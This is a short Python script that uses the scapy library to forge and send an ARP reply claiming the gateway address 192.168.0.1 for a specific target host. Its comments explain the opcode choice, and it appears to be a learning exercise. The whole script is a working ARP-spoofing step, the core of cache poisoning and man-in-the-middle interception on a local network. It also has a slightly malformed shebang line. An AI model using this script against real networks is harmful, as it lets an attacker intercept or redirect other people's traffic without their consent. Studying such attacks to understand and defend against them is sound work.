#!usr/bin/env python3

import scapy.all as scapy 

packet = scapy.ARP(op = 2,pdst="192.168.0.103", hwdst= "1c:61:b4:36:fd:32", psrc= "192.168.0.1") 
#By default op is 1(arp request), setting it to 2 will create an ARP response 
scapy.send(packet)
#print(packet.show())
#print(packet.summary())